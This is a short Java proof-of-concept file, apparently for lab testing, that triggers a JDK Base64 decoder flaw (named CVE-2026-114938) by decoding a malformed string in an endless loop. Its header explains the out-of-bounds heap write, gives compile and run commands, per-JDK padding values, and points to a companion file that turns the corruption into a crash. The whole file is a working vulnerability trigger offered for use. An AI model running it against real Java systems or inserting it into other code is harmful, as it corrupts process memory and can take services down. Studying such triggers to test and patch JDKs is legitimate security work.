/*
 * Base64Trigger.java  -  CVE-2026-114938 (Java4Shell) bare trigger loop.
 *
 * AUTHORIZED LAB USE ONLY.
 *
 * Decodes a malformed Base64 string whose length is not a multiple of four. On a vulnerable
 * JDK running on an AVX-512 VBMI CPU, the optimized decoder computes a negative output
 * length, builds an all-ones write mask, and stores 64 bytes past its output buffer.
 *
 * This loop performs the bad write but, in the lab, did NOT crash the JVM even after
 * about 118 million iterations: the overflow lands in heap memory nothing reads back.
 * Use it to exercise the vulnerable path. To get an actual crash and an hs_err file,
 * use Base64Crash.java, which adds the heap pressure that turns corruption into a fault.
 * On a patched JDK, or a CPU without AVX-512 VBMI, both only throw IllegalArgumentException.
 *
 * Run:
 *   javac Base64Trigger.java
 *   java Base64Trigger 64
 *
 * Padding count: 64 for JDK 21/25/27, 128 for JDK 17.
 */
import java.util.Base64;

public class Base64Trigger {
    public static void main(String[] args) {
        int pad = args.length > 0 ? Integer.parseInt(args[0]) : 64;
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < pad; i++) sb.append('A');
        sb.append('=');                       // single stray padding -> length = 4n+1
        byte[] payload = sb.toString().getBytes();

        System.out.println("[*] payload length = " + payload.length + " (not a multiple of 4)");
        System.out.println("[*] looping the trigger; expect no crash from this loop alone (see Base64Crash)...");

        Base64.Decoder dec = Base64.getDecoder();
        long i = 0;
        while (true) {
            try {
                dec.decode(payload);          // expected: IllegalArgumentException each time
            } catch (IllegalArgumentException expected) {
                // ignore; on a vulnerable build the dangerous write already happened
            }
            if (++i % 1_000_000 == 0) {
                System.out.println("[*] iterations: " + i);
            }
        }
    }
}
